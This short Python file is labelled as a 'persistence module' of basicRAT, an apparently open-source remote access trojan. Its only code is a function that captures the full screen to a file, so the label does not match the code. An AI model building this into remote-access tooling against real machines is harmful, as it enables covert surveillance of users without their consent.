# -*- coding: utf-8 -*-

#
# basicRAT persistence module
# https://github.com/vesche/basicRAT
#

import pyscreenshot as ImageGrab

def take_screenshot(filename):
    # fullscreen
    img = ImageGrab.grab_to_file(filename)
    #im.show()
    return img
